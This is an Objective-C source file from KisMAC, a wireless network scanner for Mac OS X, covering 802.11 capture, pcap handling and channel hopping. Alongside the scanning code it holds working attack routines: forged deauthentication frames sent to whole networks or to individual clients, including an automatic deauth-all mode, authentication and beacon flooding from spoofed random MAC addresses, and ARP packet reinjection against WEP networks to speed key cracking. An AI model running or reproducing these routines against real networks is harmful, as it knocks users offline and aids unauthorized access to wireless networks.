/*
        
        File:			WaveScanner.mm
        Program:		KisMAC
		Author:			Michael Ro§berg
						mick@binaervarianz.de
		Description:	KisMAC is a wireless stumbler for MacOS X.
                
        This file is part of KisMAC.

    KisMAC is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    KisMAC is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with KisMAC; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/
#import "WaveScanner.h"
#import "ScanController.h"
#import "ScanControllerScriptable.h"
#import "WaveHelper.h"
#import "Apple80211.h"
#import "WaveDriver.h"
#import "KisMACNotifications.h"
#import "80211b.h"
#include <unistd.h>
#include <stdlib.h>

@implementation WaveScanner

- (id)init {
    self = [super init];
    if (!self) return nil;
    
    _scanning=NO;
    _driver = 0;
    
    srandom(55445);	//does not have to be to really random
    
    _scanInterval = 0.25;
    _graphLength = 0;
    _soundBusy = NO;
    
    return self;
}

#pragma mark -

- (WaveDriver*) getInjectionDriver {
    unsigned int i;
    NSArray *a;
    WaveDriver *w = Nil;
    
    a = [WaveHelper getWaveDrivers];
    for (i = 0; i < [a count]; i++) {
        w = [a objectAtIndex:i];
        if ([w allowsInjection]) break;
    }
    
    if (![w allowsInjection]) {
        NSRunAlertPanel(NSLocalizedString(@"Invalid Injection Option.", "No injection driver title"),
            NSLocalizedString(@"Invalid Injection Option description", "LONG description of the error"),
            //@"None of the drivers selected are able to send raw frames. Currently only PrismII based device are able to perform this task."
            OK, Nil, Nil);
        return Nil;
    }
    
    return w;
}

//was originally for packet re-injection
-(void)handleInjection:(WLFrame*) frame {
    const UInt8 BROADCAST[] = "\xFF\xFF\xFF\xFF\xFF\xFF";
	
	//only data packets are interesting for injection
    if (frame->frameControl & IEEE80211_TYPE_MASK != IEEE80211_TYPE_DATA) return;
        
    if (aPacketType == 0) {
        //do rst handling here
        if ((frame->dataLen==TCPRST_SIZE) && (memcmp(frame->address1,_MACs,18)==0)) {
            goto got;
        }
    } else if (frame->dataLen==ARP_SIZE || frame->dataLen == ARP_SIZE_PADDING) {
		if (frame->frameControl & IEEE80211_DIR_TODS) {
			if (memcmp(frame->address1, _MACs,     6) != 0) return; //check BSSID
			if (memcmp(frame->address3, BROADCAST, 6) == 0 || memcmp(frame->address2, BROADCAST, 6) == 0) return; //arp replies are no broadcasts
			if (memcmp(frame->address3, &_MACs[6], 6) != 0 && memcmp(frame->address2, &_MACs[6], 6) != 0) return;
		} else if (frame->frameControl & IEEE80211_DIR_FROMDS) {
			if (memcmp(frame->address2, _MACs,     6) != 0) return; //check BSSID
			if (memcmp(frame->address1, BROADCAST, 6) == 0 || memcmp(frame->address3, BROADCAST, 6) == 0) return;
			if (memcmp(frame->address1, &_MACs[6], 6) != 0 && memcmp(frame->address3, &_MACs[6], 6) != 0) return;
		}
		
		goto got;
    }
    
    return;
    
got:
    _injReplies++;
}

#pragma mark -
-(void)performScan:(NSTimer*)timer {
    [_container scanUpdate:_graphLength];
    
    if(_graphLength < MAX_YIELD_SIZE)
        _graphLength++;

    [aController updateNetworkTable:self complete:NO];
    
    [_container ackChanges];
}


//does the active scanning (extra thread)
- (void)doActiveScan:(WaveDriver*)wd {
    NSArray *nets;
    NSDictionary *network;
    unsigned int i;
    float interval;
    NSUserDefaults *defs = [NSUserDefaults standardUserDefaults];
    
    interval = [defs floatForKey:@"activeScanInterval"];
    
    while (_scanning) {
        nets = [wd networksInRange];
        
        if (nets) {
            for(i=0; i<[nets count]; i++) {
                network = [nets objectAtIndex:i];                
                [_container addAppleAPIData:network];
            }
        }
        [NSThread sleepUntilDate:[NSDate dateWithTimeIntervalSinceNow:interval]];
    }
}

//does the actual scanning (extra thread)
- (void)doPassiveScan:(WaveDriver*)wd {
    WavePacket *w=Nil;
    WLFrame* frame=NULL;
    pcap_dumper_t* f=NULL;
    pcap_t* p=NULL;
    NSString* path;
    char err[PCAP_ERRBUF_SIZE];
    NSSound* geiger;
    NSAutoreleasePool *pool;
    int i;
    
    int dumpFilter;
    NSString *dumpDestination;
    NSDictionary *d;
    
    d = [wd configuration];
    dumpFilter = [[d objectForKey:@"dumpFilter"] intValue];
    dumpDestination = [d objectForKey:@"dumpDestination"];
    
    //tries to open the dump file
    if (dumpFilter) {
        //in the example dump are informations like 802.11 network
        path = [[[NSBundle mainBundle] resourcePath] stringByAppendingString:@"/example.dump"];
        p = pcap_open_offline([path cString],err);
        if (p==NULL) {
            NSBeginAlertSheet(NSLocalizedString(@"Fatal Error", "Internal KisMAC error title"),
                OK, NULL, NULL, [WaveHelper mainWindow], self, NULL, NULL, NULL,
                NSLocalizedString(@"Could not open example dump file", "Error description. example dump is an internal file"));
            goto error;
        }
        
        i = 1;
        //opens output
        path = [[NSDate date] descriptionWithCalendarFormat:[dumpDestination stringByExpandingTildeInPath] timeZone:nil locale:nil];
        while ([[NSFileManager defaultManager] fileExistsAtPath: path]) {
            path = [[NSString stringWithFormat:@"%@.%u", dumpDestination, i] stringByExpandingTildeInPath];
            path = [[NSDate date] descriptionWithCalendarFormat:path timeZone:nil locale:nil];
            i++;
        }
        
        f=pcap_dump_open(p,[path cString]);
        if (f==NULL) {
            NSBeginAlertSheet(ERROR_TITLE, 
                OK, NULL, NULL, [WaveHelper mainWindow], self, NULL, NULL, NULL, 
                NSLocalizedString(@"Could not create dump", "LONG error description with possible causes."),
                //@"Could not create dump file %@. Are you sure that the permissions are set correctly?" 
                path);
            goto error;
        }
    }
    
    w = [[WavePacket alloc] init];
	pool = [NSAutoreleasePool new];
	
    if (_geigerSound!=Nil) {
        geiger=[NSSound soundNamed:_geigerSound];
        if (geiger!=Nil) [geiger setDelegate:self];
    } else geiger=Nil;
    
    [wd startCapture:0];
    while (_scanning) {				//this is for canceling
		@try {
			frame = [wd nextFrame];     //captures the next frame (locking)
			if (frame==NULL) 
				break;
			
			if (_injecting) {
				[self handleInjection:frame];
				//continue;
			}
        
			if ([w parseFrame:frame] != NO) {	//parse packet (no if unknown type)
				if ([_container addPacket:w liveCapture:YES]==NO) continue; // the packet shall be dropped

				if ((dumpFilter==1)||((dumpFilter==2)&&([w type]==IEEE80211_TYPE_DATA))||((dumpFilter==3)&&([w isResolved]!=-1))) [w dump:f]; //dump if needed
				
				if (_deauthing && [w toDS]) {
					if (![_container IDFiltered:[w rawSenderID]] && ![_container IDFiltered:[w rawBSSID]])
						[self deauthenticateClient:[w rawSenderID] inNetworkWithBSSID:[w rawBSSID]];
				}
				
				if ((geiger!=Nil) && ((_packets % _geigerInt)==0)) {
					if (_soundBusy) _geigerInt+=10;
					else {
						_soundBusy=YES;
						[geiger play];
					}
				}
				
				_packets++;
				if (_packets % 10000 == 0) {
					[pool release];
					pool = [NSAutoreleasePool new];
				}
				_bytes+=[w length];
			}
		} @finally {}
    }

error:
    [w release];
	[pool release];
	
    if (f) pcap_dump_close(f);
    if (p) pcap_close(p);
}

- (void)doScan:(WaveDriver*)w {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    [NSThread setThreadPriority:1.0];	//we are important

    if ([w type] == passiveDriver) { //for PseudoJack this is done by the timer
        [self doPassiveScan:w];
    } else if ([w type] == activeDriver) {
        [self doActiveScan:w];
    }

    [w stopCapture];
    [self stopScanning];					//just to make sure the user can start the thread if it crashed
    [pool release];
}

- (bool)startScanning {
    WaveDriver *w;
    NSArray *a;
    unsigned int i;
    
    if (!_scanning) {			//we are already scanning
        _scanning=YES;
        a = [WaveHelper getWaveDrivers];
        [WaveHelper secureReplace:&_drivers withObject:a];
        
        for (i = 0; i < [_drivers count]; i++) {
            w = [_drivers objectAtIndex:i];
            [NSThread detachNewThreadSelector:@selector(doScan:) toTarget:self withObject:w];
        }
        
        _scanTimer = [NSTimer scheduledTimerWithTimeInterval:_scanInterval target:self selector:@selector(performScan:) userInfo:Nil repeats:TRUE];
        if (_hopTimer == Nil)
            _hopTimer=[NSTimer scheduledTimerWithTimeInterval:aFreq target:self selector:@selector(doChannelHop:) userInfo:Nil repeats:TRUE];
    }
    
    return YES;
}

- (bool)stopScanning {
    if (_scanning) {
		[GrowlController notifyGrowlStopScan];
        _scanning=NO;
        [_scanTimer invalidate];
        _scanTimer = nil;
        [[NSNotificationCenter defaultCenter] postNotificationName:KisMACStopScanForced object:self];

        if (_hopTimer!=Nil) {
            [_hopTimer invalidate];
            _hopTimer=Nil;
        }
		
    }
    return YES;
}

- (bool)sleepDrivers: (bool)isSleepy{
    WaveDriver *w;
    NSArray *a;
    unsigned int i;
    
    a = [WaveHelper getWaveDrivers];
    [WaveHelper secureReplace:&_drivers withObject:a];
        
   if (isSleepy) {
		NSLog(@"Going to sleep...");
        _shouldResumeScan = _scanning;
        [aController stopScan];
		for (i = 0; i < [_drivers count]; i++) {
			w = [_drivers objectAtIndex:i];
            [w sleepDriver];
        }
    } else {
		NSLog(@"Waking up...");
		for (i = 0; i < [_drivers count]; i++) {
			w = [_drivers objectAtIndex:i];
            [w wakeDriver];
		}
        if (_shouldResumeScan) {
            [aController startScan];
        }
    }

    return YES;
}

- (void)doChannelHop:(NSTimer*)timer {
    unsigned int i;
    
    for (i = 0; i < [_drivers count]; i++) {
        [[_drivers objectAtIndex:i] hopToNextChannel];
    }
}

-(void)setFrequency:(double)newFreq {
    aFreq=newFreq;
    if (_hopTimer!=Nil) {
        [_hopTimer invalidate];
        _hopTimer=[NSTimer scheduledTimerWithTimeInterval:aFreq target:self selector:@selector(doChannelHop:) userInfo:Nil repeats:TRUE];
    }
   
}
-(void)setGeigerInterval:(int)newGeigerInt sound:(NSString*) newSound {
    
    [WaveHelper secureRelease:&_geigerSound];
    
    if ((newSound==Nil)||(newGeigerInt==0)) return;
    
    _geigerSound=[newSound retain];
    _geigerInt=newGeigerInt;
}

#pragma mark -

- (NSTimeInterval)scanInterval {
    return _scanInterval;
}
- (int)graphLength {
    return _graphLength;
}

//#define DUMP_DUMPS

//reads in a pcap file
-(void)readPCAPDump:(NSString*) dumpFile {
    char err[PCAP_ERRBUF_SIZE];
    WavePacket *w;
    WLFrame* frame=NULL;
    bool corrupted;
    
#ifdef DUMP_DUMPS
    pcap_dumper_t* f=NULL;
    pcap_t* p=NULL;
    NSString *aPath;
    
    if (aDumpLevel) {
        //in the example dump are informations like 802.11 network
        aPath=[[[NSBundle mainBundle] resourcePath] stringByAppendingString:@"/example.dump"];
        p=pcap_open_offline([aPath cString],err);
        if (p==NULL) return;
        //opens output
        aPath=[[NSDate date] descriptionWithCalendarFormat:[aDumpFile stringByExpandingTildeInPath] timeZone:nil locale:nil];
        f=pcap_dump_open(p,[aPath cString]);
        if (f==NULL)return;
    }
#endif
    
    _pcapP=pcap_open_offline([dumpFile cString],err);
    if (_pcapP==NULL) {
        NSLog(@"Could not open dump file: %@. Reason: %s", dumpFile, err);
        return;
    }

	if (pcap_datalink(_pcapP) != DLT_IEEE802_11) {
	    NSLog(@"Could not open dump file: %@. Unsupported Datalink Type.", dumpFile);
		pcap_close(_pcapP);
        return;
	}
	
    memset(aFrameBuf, 0, sizeof(aFrameBuf));
    aWF=(WLFrame*)aFrameBuf;
    
    w=[[WavePacket alloc] init];

    while (true) {
        frame = [self nextFrame:&corrupted];
        if (frame==NULL) {
            if (corrupted) continue;
            else break;
        }
        if ([w parseFrame:frame]!=NO) {

            if ([_container addPacket:w liveCapture:NO]==NO) continue; // the packet shall be dropped
            
#ifdef DUMP_DUMPS
            if ((aDumpLevel==1)||((aDumpLevel==2)&&([w type]==IEEE80211_TYPE_DATA))||((aDumpLevel==3)&&([w isResolved]!=-1))) [w dump:f]; //dump if needed
#endif
        }
    }

#ifdef DUMP_DUMPS
    if (f) pcap_dump_close(f);
    if (p) pcap_close(p);
#endif

    [w release];
    pcap_close(_pcapP);
}


//returns the next frame in a pcap file
//this basicly converts a 802.11 frame to a WLFrame
//#define USE_RAW_FRAMES

-(WLFrame*) nextFrame:(bool*)corrupted {
    UInt8 *b;
    UInt16 *p;
    struct pcap_pkthdr h;
    unsigned int aHeaderLength;
#ifndef USE_RAW_FRAMES
    int aType, aSubtype;
    bool aIsToDS;
    bool aIsFrDS;
#endif
    
    *corrupted = NO;
    
    b=(UInt8*)pcap_next(_pcapP,&h);	//get frame from current pcap file
    if(b==NULL) return NULL;

    *corrupted = YES;
    
#ifdef USE_RAW_FRAMES
    p=(UInt16*)aWF;						//p points to 802.11 header in our WLFrame	    
    memcpy(p,b,((h.caplen<60) ? h.caplen : 60));		//copy the whole frame into our WLFrame (or just the header)
    
    aWF->channel = 0;
    aHeaderLength=sizeof(WLFrame);
    if (h.caplen<aHeaderLength) return NULL;	//corrupted frame
    aWF->dataLen=aWF->length;	
#else
    p=(UInt16*)(((char*)aWF)+sizeof(struct sAirportFrame));	//p points to 802.11 header in our WLFrame	    
    memcpy(p,b,((h.caplen<30) ? h.caplen : 30));		//copy the whole frame into our WLFrame (or just the header)

    aType=(aWF->frameControl & IEEE80211_TYPE_MASK);
    aSubtype=(aWF->frameControl & IEEE80211_SUBTYPE_MASK);
    aIsToDS=((aWF->frameControl & IEEE80211_DIR_TODS) ? YES : NO);
    aIsFrDS=((aWF->frameControl & IEEE80211_DIR_FROMDS) ? YES : NO);

    //depending on the frame we have to figure the length of the header
    switch(aType) {
        case IEEE80211_TYPE_DATA: //Data Frames
            if (aIsToDS&&aIsFrDS) aHeaderLength=30; //WDS Frames are longer
            else aHeaderLength=24;
            break;
        case IEEE80211_TYPE_CTL: //Control Frames
            switch(aSubtype) {
                case IEEE80211_SUBTYPE_PS_POLL:
                case IEEE80211_SUBTYPE_RTS:
                    aHeaderLength=16;
                    break;
                case IEEE80211_SUBTYPE_CTS:
                case IEEE80211_SUBTYPE_ACK:
                    aHeaderLength=10;
                    break;
                default:
                    return NULL;
            }
            break;
        case IEEE80211_TYPE_MGT: //Management Frame
            aHeaderLength=24;
            break;
        default:
            return NULL;
    }
    if (h.caplen<aHeaderLength) return NULL;	//corrupted frame
    aWF->dataLen=h.caplen-aHeaderLength;	
#endif

    memcpy(((char*)aWF)+sizeof(WLFrame),b+aHeaderLength,aWF->dataLen);	//copy framebody into WLFrame

    return aWF;   
}

#pragma mark -

- (void) setDeauthingAll:(BOOL)deauthing {
	_deauthing = deauthing;
}

- (bool) deauthenticateNetwork:(WaveNet*)net atInterval:(int)interval {
    int tmp[6];
    UInt8 x[6];
    unsigned int i;
    WaveDriver *w;

    struct {
        WLFrame hdr;
        UInt16  reason;
    }__attribute__ ((packed)) frame;

    w = [self getInjectionDriver];
    if (!w) return NO;
    
    if ([net type]!=2) return NO;
    
    if(sscanf([[net BSSID] cString], "%x:%x:%x:%x:%x:%x", &tmp[0], &tmp[1], &tmp[2], &tmp[3], &tmp[4], &tmp[5]) < 6) return NO;
    memset(&frame,0,sizeof(frame));
    frame.hdr.frameControl=IEEE80211_TYPE_MGT | IEEE80211_SUBTYPE_DEAUTH | IEEE80211_DIR_FROMDS;
    memcpy(frame.hdr.address1,"\xff\xff\xff\xff\xff\xff", 6);	//global deauth
    for (i=0;i<6;i++) x[i]=tmp[i] & 0xff;
    memcpy(frame.hdr.address2,x, 6);
    memcpy(frame.hdr.address3,x, 6);
    frame.hdr.dataLen=2;
    frame.reason=NSSwapHostShortToLittle(2);
    
    frame.hdr.sequenceControl=random() & 0x0FFF;

    [w sendFrame:(UInt8*)&frame withLength:sizeof(frame) atInterval:interval];
    
    return YES;
}

- (bool) deauthenticateClient:(UInt8*)client inNetworkWithBSSID:(UInt8*)bssid {
    WaveDriver *w;

    struct {
        WLFrame hdr;
        UInt16  reason;
    }__attribute__ ((packed)) frame;

	if (!client || !bssid) return NO;
    w = [self getInjectionDriver];
    if (!w) return NO;
    
    memset(&frame,0,sizeof(frame));
    frame.hdr.frameControl = IEEE80211_TYPE_MGT | IEEE80211_SUBTYPE_DEAUTH | IEEE80211_DIR_FROMDS;
    memcpy(frame.hdr.address1, client, 6);	// out target
    memcpy(frame.hdr.address2, bssid, 6);
    memcpy(frame.hdr.address3, bssid, 6);
    frame.hdr.dataLen=2;
    frame.reason=NSSwapHostShortToLittle(1);
    
    [w sendFrame:(UInt8*)&frame withLength:sizeof(frame) atInterval:0];
    
    return YES;
}

- (void)doAuthFloodNetwork:(WaveDriver*)w {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    UInt16 x[3];
    
    while (_authenticationFlooding) {
        x[0] = random() & 0x0FFF;
        x[1] = random();
        x[2] = random();
        
        memcpy(_authFrame.hdr.address2, x, 6); //needs to be random
    
        [w sendFrame:(UInt8*)&_authFrame withLength:sizeof(_authFrame) atInterval:0];
        [NSThread sleepUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.01]];
    }
    
    [pool release];
}

- (bool) authFloodNetwork:(WaveNet*)net {
    int tmp[6];
    UInt8 x[6];
    unsigned int i;
    WaveDriver *w = Nil;
   
    w = [self getInjectionDriver];
    if (!w) return NO;
    
    if ([net type]!=2) return NO;
    
    if(sscanf([[net BSSID] cString], "%x:%x:%x:%x:%x:%x", &tmp[0], &tmp[1], &tmp[2], &tmp[3], &tmp[4], &tmp[5]) < 6) return NO;

    memset(&_authFrame,0,sizeof(_authFrame));
    
    _authFrame.hdr.frameControl=IEEE80211_TYPE_MGT | IEEE80211_SUBTYPE_AUTH | IEEE80211_DIR_TODS;
    for (i=0;i<6;i++) x[i]=tmp[i] & 0xff;
    
    memcpy(_authFrame.hdr.address1,x, 6);
    memcpy(_authFrame.hdr.address2,x, 6); //needs to be random
    memcpy(_authFrame.hdr.address3,x, 6);
    
    _authFrame.hdr.dataLen=6;
    _authFrame.wi_algo = 0;
    _authFrame.wi_seq = NSSwapHostShortToLittle(1);
    _authFrame.wi_status = 0;
    
    _authFrame.hdr.sequenceControl=random() & 0x0FFF;

    _authenticationFlooding = YES;
    
    [NSThread detachNewThreadSelector:@selector(doAuthFloodNetwork:) toTarget:self withObject:w];
    
    return YES;
}

- (void)doBeaconFloodNetwork:(WaveDriver*)w {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	NSUserDefaults *defs;
	defs = [NSUserDefaults standardUserDefaults];
    UInt16 x[3];
    int i = 0;
    
    while (_beaconFlooding) {
        x[0] = random() & 0x0F00;
        x[1] = random() & 0x00F0;
        x[2] = random() & 0x000F;
        
        memcpy(_beaconFrame.hdr.address2, x, 6); //needs to be random
        memcpy(_beaconFrame.hdr.address3, x, 6); //needs to be random
    
        [w sendFrame:(UInt8*)&_beaconFrame withLength:sizeof(_beaconFrame) atInterval:0];
        [NSThread sleepUntilDate:[NSDate dateWithTimeIntervalSinceNow:[[defs objectForKey:@"bf_interval"] floatValue]]];
        if (i++>600) break;
    }
    
    [pool release];
}

- (bool) beaconFlood {
    WaveDriver *w = Nil;
   
    w = [self getInjectionDriver];
    if (!w) return NO;
    
    memset(&_beaconFrame, 0 ,sizeof(_beaconFrame));
    
    _beaconFrame.hdr.frameControl = IEEE80211_TYPE_MGT | IEEE80211_SUBTYPE_BEACON | IEEE80211_DIR_FROMDS;
    
    memset(_beaconFrame.hdr.address1, 0xff, 18); //set it to broadcast
    
    _beaconFrame.hdr.dataLen = 27;
    memcpy(&_beaconFrame.wi_timestamp, "\x01\x23\x45\x67\x89\xAB\xCD\xEF", 8);
    _beaconFrame.wi_interval = NSSwapHostShortToLittle(64);
    _beaconFrame.wi_capinfo = 0x0011;
    _beaconFrame.wi_tag_ssid = 0;
    _beaconFrame.wi_ssid_len = 4;
    _beaconFrame.wi_ssid = 0x6c696e6b;
    _beaconFrame.wi_tag_rates = 1;
    _beaconFrame.wi_rates_len = 4;
    _beaconFrame.wi_rates = 0x82848b96;
    _beaconFrame.wi_tag_channel = 3;
    _beaconFrame.wi_channel_len = 1;
    _beaconFrame.wi_channel = 6;
    
    _beaconFrame.hdr.sequenceControl=random() & 0x0FFF;

    _beaconFlooding = YES;
    
    [NSThread detachNewThreadSelector:@selector(doBeaconFloodNetwork:) toTarget:self withObject:w];
    
    return YES;
}

- (NSString*) tryToInject:(WaveNet*)net {
    int q, w;
    UInt8 packet[2364];
    UInt8 helper[2364];
    NSMutableArray *p;
    NSData *f;
    WLFrame *x, *y;
    struct kj {
        char a[256];
    };
    struct kj *debug;
    int channel;

    WaveDriver *wd = Nil;

    wd = [self getInjectionDriver];
    NSParameterAssert(wd);
    NSParameterAssert([net type] == networkTypeManaged);
    NSParameterAssert([net wep] == encryptionTypeWEP || [net wep] == encryptionTypeWEP40);
    
    channel = [wd getChannel];
    
    _injecting=YES;
    
    NSLog(@"Packet Reinjection: %u ACK Packets.\n",[[net ackPacketsLog] count]);
    NSLog(@"Packet Reinjection: %u ARP Packets.\n",[[net arpPacketsLog] count]);
        
    y=(WLFrame*)helper;
    x=(WLFrame*)packet;
    
    for(w=1;w<2;w++) {
        if (w) p = [net arpPacketsLog];
        else   p = [net ackPacketsLog];
         
        aPacketType = w;

        while([p count] > 0 && ![[WaveHelper importController] canceled]) {
            memset(packet, 0, 2364);
            memset(helper, 0, 2364);
            
            f = [p lastObject];
            [f getBytes:(char*)(helper+sizeof(sAirportFrame)) length: 2364 - sizeof(sAirportFrame)];
            q = [f length] - 24; // 24 is headersize of data packet
            memcpy(packet, helper, 24 + sizeof(sAirportFrame));
            memcpy(packet +  sizeof(WLFrame), y->address4, q);
            x->dataLen = q;
            x->status  = 0;
            			
            debug = (struct kj*)x;
            
			_injReplies = 0;
            
            if (x->frameControl & IEEE80211_DIR_TODS) {
				memcpy(_MACs,     x->address1, 6); //this is the BSSID
				memcpy(&_MACs[6], x->address2, 6); //this is the source
				if (memcmp(x->address3, "\xff\xff\xff\xff\xff\xff", 6) != 0) continue;
			} else {
				memcpy(_MACs,     x->address2, 6); //BSSID
				memcpy(&_MACs[6], x->address3, 6); //source
				if (memcmp(x->address1, "\xff\xff\xff\xff\xff\xff", 6) != 0) continue;
			}
            
            x->frameControl |= IEEE80211_WEP;
			x->sequenceControl = random() & 0x0FFF;
			x->duration = 0;

            for (q=0;q<100;q++) {
                if (![wd sendFrame:packet withLength:2364 atInterval:0])
                    [NSThread sleepUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.5]];
                [NSThread sleepUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.05]];
            }
			
			[NSThread sleepUntilDate:[NSDate dateWithTimeIntervalSinceNow:1]];
            
			if (_injReplies<20) {
                [p removeLastObject];
            } else {
                [wd sendFrame:packet withLength:2364 atInterval:5];
                _injecting=NO;
                return nil;
            }
        }
    }
    
    _injecting=NO;
    
    return @"";
}

- (bool) stopSendingFrames {
    WaveDriver *w;
    NSArray *a;
    unsigned int i;

    _authenticationFlooding = NO;
    _beaconFlooding = NO;
    _injecting = NO;
    
    a = [WaveHelper getWaveDrivers];
    for (i = 0; i < [a count]; i++) {
        w = [a objectAtIndex:i];
        if ([w allowsInjection]) [w stopSendingFrames];
    }
    
    return YES;
}

#pragma mark -

- (void)sound:(NSSound *)sound didFinishPlaying:(bool)aBool {
    _soundBusy=NO;
}

- (void)dealloc {
    [self stopSendingFrames];
    [[NSNotificationCenter defaultCenter] removeObserver:self];

    _scanning=NO;
    [super dealloc];
}

@end
